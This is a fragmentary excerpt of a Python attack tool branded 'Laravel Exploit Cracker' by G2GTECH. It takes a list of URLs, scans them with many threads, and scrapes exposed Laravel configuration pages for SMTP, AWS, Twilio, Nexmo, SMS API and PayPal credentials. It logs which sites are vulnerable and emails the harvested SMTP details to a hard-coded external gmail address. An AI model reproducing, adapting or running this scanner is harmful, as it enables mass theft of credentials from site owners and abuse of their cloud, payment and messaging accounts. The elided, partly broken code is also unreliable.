...
if os.name == 'nt':
    ctypes.windll.kernel32.SetConsoleTitleW("LARAVEL EXPLOIT CRACKER - BY G2GTECH (C) 2024 ")
...
def sendtestoff(url, mailhost, mailport, mailuser, mailpass, mailfrom):
    ...
    receiver_email = "Damife199710@gmail.com"
    message = MIMEMultipart('alternative')
    message['Subject'] = 'LARAVEL VULNER SMTP LOG | HOST: '
            ...
            if "NEXMO" in text:
                if "NEXMO_KEY=" in text:
                    ...
                    try:
                        ...
                        nexmo_secret = ''
                    try:
                        phone = reg(r'<td>EXMO_NUMBER<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
                    except:
                        phone = ''
...
with open('Results/not_vulnerable.txt', 'w') as file:
    pass
def main(url):
    resp = False
    try:
        text = f'{Fore.GREEN}{Style.RESET_ALL} {url}'
        ...
        if resp:
            ...
            if getsmtp:
                text += ' | ' + f'{Fore.GREEN}SMTP Found ==>{Style.RESET_ALL}'
            else:
                text += ' | ' + f'{Fore.RED}SMTP Found ==>{Style.RESET_ALL}'
            if getaws:
                text += ' | ' + f'{Fore.GREEN}AWS Found ==>{Style.RESET_ALL}'
            else:
                text += ' | ' + f'{Fore.RED}AWS Found ==>{Style.RESET_ALL}'
            if getwtilio:
                text += ' | ' + f'{Fore.GREEN}TWILIO Found ==>{Style.RESET_ALL}'
            else:
                text += ' | ' + f'{Fore.RED}TWILIO Found ==>{Style.RESET_ALL}'
            if smsapi:
                text += ' | ' + f'{Fore.GREEN}SMS API Found ==>{Style.RESET_ALL}'
            else:
                text += ' | ' + f'{Fore.RED}SMS API Found ==>{Style.RESET_ALL}'
            if getpp:
                text += ' | ' + f'{Fore.GREEN}PAYPAL Found ==>{Style.RESET_ALL}'
            else:
                text += ' | ' + f'{Fore.RED}PAYPAL Found ==>{Style.RESET_ALL}'
        else:
            text += f" {Fore.RED}{Style.BRIGHT}{Fore.RED} ==> Website Not Vulnerable ==> I Cannot Get Stuffs From Website{Style.RESET_ALL}"
        ...
        text += f" {Fore.RED}{Style.BRIGHT}{Fore.RED} ==> I Cannot Access The Website{Style.RESET_ALL}"
        save = open('Results/not_vulnerable.txt','a')
        asu = str(url).replace('\r', '')
        save.write(asu+'\n')
        save.close()
...
#  888   Y88b          888
#  888    888          888
#  888   d88P  .d88b.  888  .d88b.  888  888 888d888  .d88b.  88888b.   .d88b.
#  8888888P"  d8P  Y8b 888 d88P"88b 888  888 888P"   d8P  Y8b 888 "88b d88""88b
#  888        88888888 888 888  888 888  888 888     88888888 888  888 888  888
#  888        Y8b.     888 Y88b 888 Y88b 888 888     Y8b.     888  888 Y88..88P
#  888         "Y8888  888  "Y88888  "Y88888 888      "Y8888  888  888  "Y88P"
# 
#      Version : 1.1.0 (LARAVEL PRIVATE EXPLOIT CRACKER - BY G2GTECH (C) 2024)
            Telegram: @G2GTECH
# 
{Style.RESET_ALL}
""")

def prompt_for_list_and_threads():
    while True:
        try:
            lists = input(f"{Fore.CYAN}Enter the name of the list of URLs (without .txt): {Fore.RESET}") + ".txt"
            if not os.path.isfile(lists):
                print(f"{Fore.RED}Error: File not found. Try again.{Fore.RESET}")
                continue
            readsplit = open(lists).read().splitlines()
            
            # Print total number of URLs in the desired format
            print(f"{Fore.CYAN}┏{'━'*12}┓")
            print(f"┃ Total Number Of Url Loaded: {len(readsplit):3} ┃")
            print(f"┗{'━'*12}┛{Fore.RESET}")
    ...
    while True:
        try:
            numthread = int(input(f"{Fore.CYAN}Number of threads (1-50): {Fore.RESET}"))
            if numthread < 1 or numthread > 50:
                print(f"{Fore.RED}Error: Number of threads must be between 1 and 50.{Fore.RESET}")
                continue
            break
        except ValueError:
            print(f"{Fore.RED}Error: Invalid thread number. Enter a valid number.{Fore.RESET}")
    
    return lists, numthread, readsplit
...
def restore_session():
    try:
        ...
        numthread = int(readcfg.get('DB', 'THREAD'))
        sessi = readcfg.get('DB', 'SESSION')
        print("Log session bot found! Restoring session.")
        ...
        if "Y" in tanya or "y" in tanya:
            ...
            print(f"{Fore.RED}Error: Invalid response. Exiting.{Fore.RESET}")
            exit()
    except:
        return prompt_for_list_and_threads()

lists, numthread, readsplit = restore_session()

total_urls = len(readsplit)
vulnerable_count = 0
not_vulnerable_count = 0

def update_counts(url, is_vulnerable):
    global vulnerable_count, not_vulnerable_count
    if is_vulnerable:
        vulnerable_count += 1
    else:
...
for url in readsplit:
    ...
    try:
        ...
        print(f"{Fore.RED}CTRL+C detected, session saved{Fore.RESET}")
        exit()
...
print(f"{Fore.CYAN}┏{'━'*12}┓")
print(f"┃ Total URLs Loaded: {total_urls:3} ┃")
print(f"┃ Not Vulnerable: {not_vulnerable_count:3} ┃")
print(f"┃ Vulnerable: {vulnerable_count:3} ┃")
print(f"┗{'━'*12}┛{Fore.RESET}")
